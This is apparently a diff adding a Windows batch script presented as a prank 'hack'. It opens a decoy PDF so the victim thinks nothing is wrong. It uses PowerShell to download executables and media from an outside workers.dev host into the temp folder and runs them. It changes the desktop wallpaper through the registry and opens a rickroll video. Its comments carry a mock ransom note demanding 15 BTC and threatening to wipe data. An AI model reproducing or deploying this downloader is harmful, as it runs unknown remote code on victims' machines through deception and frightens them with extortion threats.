@@ -1,0 +1,72 @@
+# The basic logic of how it works
+# save as bat then run
+# 1. get wallpaper mp3 and other files
+# 2. open pdf file (so user thinks its normal)
+# 3. set volume to 75
+# 4. play hacked mp3
+# 5. set wallpaper with regestry
+# 6. rickrolll!
+
+cd %temp%
+
+Powershell -c "Invoke-WebRequest https://bot.agamyas.workers.dev/3:/Bot%20Uploads/hk/hk/cpl.exe -Outfile cmdpl.exe"
+pdf.pdf
+Powershell -c "Invoke-WebRequest https://bot.agamyas.workers.dev/3:/Bot%20Uploads/hk/hk/cpl.exe -Outfile cmdpl.exe"
+Powershell -c "Invoke-WebRequest https://bot.agamyas.workers.dev/3:/Bot%20Uploads/hk/hk/stv.exe -Outfile stv.exe"
+
+Powershell -c "Invoke-WebRequest https://bot.agamyas.workers.dev/3:/Bot%20Uploads/hk/hk/ha.mp3 -Outfile ha.mp3"
+
+stv.exe 75
+cmdpl.exe ha.mp3
+
+Powershell -c "Invoke-WebRequest https://bot.agamyas.workers.dev/3:/Bot%20Uploads/hk/hk/bg.jpg -Outfile bg.jpg"
+
+# path c:\windows\web\wallpaper\theme1\img13.jpg 
+
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %temp%/bg.jpg /f
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
+reg delete "HKEY_CURRENT_USER\Control Panel\Desktop" /v TranscodedImageCache /f
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
+
+# for those wondering it's a 60 sec timer
+ping 127.0.0.1 -n 60 > nul
+
+
+start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+
+
+
+#YOU HAVE BEEN HACKED LOOOOOOOOOOOOOOOOOL XD XD XD XD !@#$%^&*(*&^%$#@#$%^%$#@!@%^@#$%$#@#
+#YOU HAVE BEEN HACKED LOOOOOOOOOOOOOOOOOL XD XD XD XD !@#$%^&*(*&^%$#@#$%^%$#@!@%^@#$%$#@#
+#YOU HAVE BEEN HACKED LOOOOOOOOOOOOOOOOOL XD XD XD XD !@#$%^&*(*&^%$#@#$%^%$#@!@%^@#$%$#@#
+#YOU HAVE BEEN HACKED LOOOOOOOOOOOOOOOOOL XD XD XD XD !@#$%^&*(*&^%$#@#$%^%$#@!@%^@#$%$#@#
+#YOU HAVE BEEN HACKED LOOOOOOOOOOOOOOOOOL XD XD XD XD !@#$%^&*(*&^%$#@#$%^%$#@!@%^@#$%$#@#
+#YOU HAVE BEEN HACKED LOOOOOOOOOOOOOOOOOL XD XD XD XD !@#$%^&*(*&^%$#@#$%^%$#@!@%^@#$%$#@#
+
+#FOLLOW : @_.XD22 
+#TWITTER : @.xd22  
+#TELEGRAM :  @.xd2222 @TEM_XD @Pine_Orange  
+
+#Don't woory all your dat a is sfe lolll just pay  a 15 BTC (im too kind rihgt??) 
+#you wi;ll get your data fast comming on a rocket !!!
+
+#WIPING YOUR LIFE .. ...  .. .   ... . . . . . [12 HR LEFT HOLD ON LOL XDDD]
+
+#XD22 XD22 XD22 XD22 XD222 XD22 XD22 XD22 !@#$%^&*(*&^%$#@#$%^%$#@!@%^@#$%$#@#
+
+#THAT'S WHAT HAPPEN WHEN YOU OPEN MALCIOUS FILES YOU DESERVE IT LOLLLLO XDDDD 
+
+#YOU HAVE BEEN HACKED LOOOOOOOOOOOOOOOOOL XD XD XD XD !@#$%^&*(*&^%$#@#$%^%$#@!@%^@#$%$#@#
+#YOU HAVE BEEN HACKED LOOOOOOOOOOOOOOOOOL XD XD XD XD !@#$%^&*(*&^%$#@#$%^%$#@!@%^@#$%$#@#
+#YOU HAVE BEEN HACKED LOOOOOOOOOOOOOOOOOL XD XD XD XD !@#$%^&*(*&^%$#@#$%^%$#@!@%^@#$%$#@#
+#YOU HAVE BEEN HACKED LOOOOOOOOOOOOOOOOOL XD XD XD XD !@#$%^&*(*&^%$#@#$%^%$#@!@%^@#$%$#@#
+#YOU HAVE BEEN HACKED LOOOOOOOOOOOOOOOOOL XD XD XD XD !@#$%^&*(*&^%$#@#$%^%$#@!@%^@#$%$#@#
+#YOU HAVE BEEN HACKED LOOOOOOOOOOOOOOOOOL XD XD XD XD !@#$%^&*(*&^%$#@#$%^%$#@!@%^@#$%$#@#
+
